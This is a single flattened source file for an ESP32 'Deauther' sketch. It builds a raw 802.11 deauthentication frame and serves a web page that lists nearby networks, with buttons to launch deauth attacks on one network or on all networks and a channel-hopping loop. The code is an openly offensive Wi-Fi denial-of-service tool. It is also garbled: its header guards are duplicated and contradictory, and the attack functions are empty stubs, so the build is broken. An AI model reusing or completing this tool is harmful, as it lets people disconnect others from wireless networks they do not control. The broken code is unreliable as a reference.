#ifndef TYPES_H
#define TYPES_H

#ifdef TYPES_H
#define TYPES_H

typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
  uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

#endif

#endif // TYPES_H

#ifndef NET_INTERFACE_H
#define NET_INTERFACE_H

#ifdef NET_INTERFACE_H
#define NET_INTERFACE_H

void start_net_interface();
void net_interface_handle_client();

#endif


#endif // NET_INTERFACE_H

#ifndef DEAUTH_H
#define DEAUTH_H

#ifdef DEAUTH_H
#define DEAUTH_H

void start_deauth(int wifi_number, int attack_type, uint16_t reason){};
void stop_deauth(){};

extern int eliminated_stations;
extern int deauth_type;

#endif



#endif // DEAUTH_H

#ifndef DEFINITIONS_H
#define DEFINITIONS_H

#ifdef DEFINITIONS_H
#define DEFINITIONS_H
#endif

#define AP_SSID "ESP32-Deauther"
#define AP_PASS "esp32wroom32"
#define LED 2
#define SERIAL_DEBUG
#define CHANNEL_MAX 13
#define NUM_FRAMES_PER_DEAUTH 16
#define DEAUTH_BLINK_TIMES 2
#define DEAUTH_BLINK_DURATION 20
#define DEAUTH_TYPE_SINGLE 0
#define DEAUTH_TYPE_ALL 1

#ifdef SERIAL_DEBUG
#define DEBUG_PRINT(...) Serial.print(__VA_ARGS__)
#define DEBUG_PRINTLN(...) Serial.println(__VA_ARGS__)
#define DEBUG_PRINTF(...) Serial.printf(__VA_ARGS__)
#endif
#ifndef SERIAL_DEBUG
#define DEBUG_PRINT(...)
#define DEBUG_PRINTLN(...)
#define DEBUG_PRINTF(...)
#endif
#ifdef LED
#define BLINK_LED(num_times, blink_duration) blink_led(num_times, blink_duration)
#endif
#ifndef LED
#define BLINK_LED()
#endif



#endif // DEFINITIONS_H

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>

#define LED_PIN 2
#define CHANNEL_MAX 13

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

WebServer server(80);
int num_networks;
int curr_channel = 1;

void blink_led(int num_times, int blink_duration);

void blink_led(int num_times, int blink_duration) {
#ifdef LED
  for (int i = 0; i < num_times; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(blink_duration / 2);
    digitalWrite(LED_PIN, LOW);
    delay(blink_duration / 2);
  }
#endif
}



void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301);
}

void handle_root() {
  String html = "<html><body>";
  html += "<h1>ESP32-Deauther</h1>";
  html += "<h2>WiFi Networks:</h2>";
  html += "<table border='1'><tr><th>Number</th><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th></tr>";
  for (int i = 0; i < num_networks; i++) {
    html += "<tr><td>" + String(i) + "</td><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "</td></tr>";
  }
  html += "</table>";
  html += "<form method='post' action='/rescan'><input type='submit' value='Rescan networks'></form><hr>";
  html += "<form method='post' action='/deauth'>Network Number: <input type='text' name='net_num'><br>Reason code: <input type='text' name='reason'><br><input type='submit' value='Launch Deauth-Attack'></form>";
  html += "Eliminated stations: " + String(eliminated_stations) + "<br><hr>";
  html += "<form method='post' action='/deauth_all'>Reason code: <input type='text' name='reason'><br><input type='submit' value='Deauth all Networks'></form><hr>";
  html += "<form method='post' action='/stop'><input type='submit' value='Stop Deauth-Attack'></form>";
  
  html += "<table border='1'><tr><th>Reason code</th><th>Meaning</th></tr>";
  html += "<tr><td>0</td><td>Reserved.</td></tr>";
  html += "<tr><td>1</td><td>Unspecified reason.</td></tr>";
  html += "<tr><td>2</td><td>Previous authentication no longer valid.</td></tr>";
  html += "<tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>";
  html += "<tr><td>4</td><td>Disassociated due to inactivity.</td></tr>";
  html += "<tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>";
  html += "<tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>";
  html += "<tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>";
  html += "<tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>";
  html += "<tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>";
  html += "<tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>";
  html += "<tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>";
  html += "<tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>";
  html += "<tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>";
  html += "<tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>";
  html += "<tr><td>15</td><td>4-Way Handshake timeout.</td></tr>";
  html += "<tr><td>16</td><td>Group Key Handshake timeout.</td></tr>";
  html += "<tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>";
  html += "<tr><td>18</td><td>Invalid group cipher.</td></tr>";
  html += "<tr><td>19</td><td>Invalid pairwise cipher.</td></tr>";
  html += "<tr><td>20</td><td>Invalid AKMP.</td></tr>";
  html += "<tr><td>21</td><td>Unsupported RSNE version.</td></tr>";
  html += "<tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>";
  html += "<tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>";
  html += "<tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>";
  html += "</table>";
  
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  if (wifi_number < num_networks) {
    server.send(200, "text/plain", "Starting Deauth-Attack!");
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
  } else {
    server.send(200, "text/plain", "Invalid network number!");
    redirect_root();
  }
};

void handle_deauth_all() {
  server.send(200, "text/plain", "Starting Deauth-Attack on all detected stations! WiFi will shutdown now! To stop the attack, please reset the ESP32.");
  server.stop();
  uint16_t reason = server.arg("reason").toInt();
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

void handle_rescan() {
  num_networks = WiFi.scanNetworks();
  redirect_root();
}

void handle_stop() {
  stop_deauth();
  redirect_root();
}




void start_net_interface();

void net_interface_handle_client();

void start_net_interface() {
  server.on("/", handle_root);
  server.on("/deauth", handle_deauth);
  server.on("/deauth_all", handle_deauth_all);
  server.on("/rescan", handle_rescan);
  server.on("/stop", handle_stop);

  server.begin();
}

void net_interface_handle_client() {
  server.handleClient();
}

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif

#ifdef LED
  pinMode(LED_PIN, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_net_interface();
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } else {
    net_interface_handle_client();
  }
}
